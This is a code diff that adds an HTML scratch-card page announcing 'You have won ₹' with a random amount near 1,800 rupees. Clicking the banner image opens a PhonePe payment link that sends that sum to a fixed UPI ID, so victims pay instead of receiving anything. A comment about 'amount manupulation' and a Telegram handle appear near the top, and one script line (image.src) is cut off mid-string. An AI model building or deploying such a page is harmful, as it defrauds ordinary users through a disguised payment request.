@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+
+<!--- @bbhhuuiioo  telegram aaja bhai--->
+
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head><!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PTM9Y8RG2Y"></script>
+
+<script>
+
+  window.dataLayer = window.dataLayer || [];
+
+  function gtag(){dataLayer.push(arguments);}
+
+  gtag('js', new Date());
+
+
+
+  gtag('config', 'G-PTM9Y8RG2Y');
+
+</script>
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+      <link rel="stylesheet" href="style.css">
+
+      <meta property="og:type" content="website">
+
+      <meta property="og:title" content="">
+
+      <meta property="og:description" content="">
+
+      <meta property="og:image" content="rewd/prize.html">
+
+      <title></title>
+
+  <script>
+
+  
+
+
+
+function randomNumber(min, max) {
+
+  return Math.random() * (max - min) + min;
+
+}
+
+
+
+var price = Math.floor(randomNumber(1799,1899));
+
+console.log(price);
+
+
+
+  </script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-N5MDHE5H04"></script>
+
+<script>
+
+  window.dataLayer = window.dataLayer || [];
+
+  function gtag(){dataLayer.push(arguments);}
+
+  gtag('js', new Date());
+
+
+
+  gtag('config', 'G-N5MDHE5H04');
+
+</script>
+
+
+
+
+
+</head>
+
+
+
+<!-- ///////Amount manupulation/////////// -->
+
+
+
+
+
+
+
+
+
+<body>
+
+     <div>
+
+            <img src="https://i.ibb.co/w4KyPXB/R1.jpg" width="100%" height="auto">
+
+        </div>
+
+    <!-- ////////////////////////// -->
+
+    <!-- ////////////// -->
+
+<div class="container" id="js-container">
+
+      <div class="confetti"></div>
+
+      <div class="confetti"></div> 
+  
+      <div class="confetti"></div>
+ 
+      <div class="confetti"></div>
+
+      <div class="confetti"></div>
+
+      <div class="confetti"></div>
+
+      <div class="confetti"></div>
+
+      <div class="confetti"></div>
+
+      <div class="confetti"></div>
+
+      <div class="confetti"></div>
+
+      <div class="confetti"></div>
+
+        <canvas class="canvas" id="js-canvas" width="290" height="290" style="z-index: 2;height: 299px; width: 309px;"></canvas>
+
+        <form class="form" style="visibility: visible;">
+
+        <img src="https://i.ibb.co/n8MzRg1/PPP.jpg" width="100%" height="auto">
+
+        <span style="position: absolute;left: 15px;right: 0;z-index: 1;bottom: 0;">
+
+        <center>
+
+            <h2><b>You have won</b></h2>
+
+            <h2><b>₹<script>document.write(price)</script></b></h2>
+
+        </center>
+
+        </span>
+
+        </form>  
+
+      </div>
+      
+
+<img src="https://i.ibb.co/9wR38zm/R2.jpg" width="100%" height="auto" onclick="location.href='phonepe://pay?pa=rdxpipli@axl&am='+price+'&cu=INR&mode=01&mc=5411&mam=850&tn=Rpm&Payments1549518577'">
+
+         
+
+<script>
+
+    (function() {
+
+  
+
+  'use strict';
+
+  
+
+  var isDrawing, lastPoint;
+
+  var container    = document.getElementById('js-container'),
+
+      canvas       = document.getElementById('js-canvas'),
+
+      canvasWidth  = canvas.width,
+
+      canvasHeight = canvas.height,
+
+      ctx          = canvas.getContext('2d'),
+
+      image        = new Image(),
+
+      brush        = new Image();
+
+      
+
+  // base64 Workaround because Same-Origin-Policy
+
+  image.src="
+
+  canvas.addEventListener('mousedown', handleMouseDown, false);
+
+  canvas.addEventListener('touchstart', handleMouseDown, false);
+
+  canvas.addEventListener('mousemove', handleMouseMove, false);
+
+  canvas.addEventListener('touchmove', handleMouseMove, false);
+
+  canvas.addEventListener('mouseup', handleMouseUp, false);
+
+  canvas.addEventListener('touchend', handleMouseUp, false);
+
+  
+
+  function distanceBetween(point1, point2) {
+
+    return Math.sqrt(Math.pow(point2.x - point1.x, 2) + Math.pow(point2.y - point1.y, 2));
+
+  }
+
+  
+
+  function angleBetween(point1, point2) {
+
+    return Math.atan2( point2.x - point1.x, point2.y - point1.y );
+
+  }
+
+  
+
+  // Only test every `stride` pixel. `stride`x faster,
+
+  // but might lead to inaccuracy
+
+  function getFilledInPixels(stride) {
+
+    if (!stride || stride < 1) { stride = 1; }
+
+    
+
+    var pixels   = ctx.getImageData(0, 0, canvasWidth, canvasHeight),
+
+        pdata    = pixels.data,
+
+        l        = pdata.length,
+
+        total    = (l / stride),
+
+        count    = 0;
+
+    
+
+    // Iterate over all pixels
+
+    for(var i = count = 0; i < l; i += stride) {
+
+      if (parseInt(pdata[i]) === 0) {
+
+        count++;
+
+      }
+
+    }
+
+    
+
+    return Math.round((count / total) * 100);
+
+  }
+
+  
+
+  function getMouse(e, canvas) {
+
+    var offsetX = 0, offsetY = 0, mx, my;
+
+
+
+    if (canvas.offsetParent !== undefined) {
+
+      do {
+
+        offsetX += canvas.offsetLeft;
+
+        offsetY += canvas.offsetTop;
+
+      } while ((canvas = canvas.offsetParent));
+
+    }
+
+
+
+    mx = (e.pageX || e.touches[0].clientX) - offsetX;
+
+    my = (e.pageY || e.touches[0].clientY) - offsetY;
+
+
+
+    return {x: mx, y: my};
+
+  }
+
+  
+
+  function handlePercentage(filledInPixels) {
+
+    filledInPixels = filledInPixels || 0;  
+
+    if (filledInPixels > 40) {
+
+      canvas.parentNode.removeChild(canvas);
+
+      var elems = document.getElementsByClassName("confetti");
+
+      for(var i=0;i<elems.length;i++)
+
+      {
+
+      document.querySelectorAll('.confetti')[i].style.visibility = 'visible';
+
+      }
+
+    }
+
+  }
+
+  
+
+  function handleMouseDown(e) {
+
+    isDrawing = true;
+
+    lastPoint = getMouse(e, canvas);
+
+  }
+
+
+
+  function handleMouseMove(e) {
+
+    if (!isDrawing) { return; }
+
+    
+
+    e.preventDefault();
+
+
+
+    var currentPoint = getMouse(e, canvas),
+
+        dist = distanceBetween(lastPoint, currentPoint),
+
+        angle = angleBetween(lastPoint, currentPoint),
+
+        x, y;
+
+    
+
+    for (var i = 0; i < dist; i++) {
+
+      x = lastPoint.x + (Math.sin(angle) * i) - 25;
+
+      y = lastPoint.y + (Math.cos(angle) * i) - 25;
+
+      ctx.globalCompositeOperation = 'destination-out';
+
+      ctx.drawImage(brush, x, y);
+
+    }
+
+    
+
+    lastPoint = currentPoint;
+
+    handlePercentage(getFilledInPixels(32));
+
+  }
+
+
+
+  function handleMouseUp(e) {
+
+    isDrawing = false;
+
+  }
+
+  
+
+})();
+
+</script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-3FHP159NKS"></script>
+
+<script>
+
+  window.dataLayer = window.dataLayer || [];
+
+  function gtag(){dataLayer.push(arguments);}
+
+  gtag('js', new Date());
+
+
+
+  gtag('config', 'G-3FHP159NKS');
+
+</script>
+
+</body>
+
+</html>
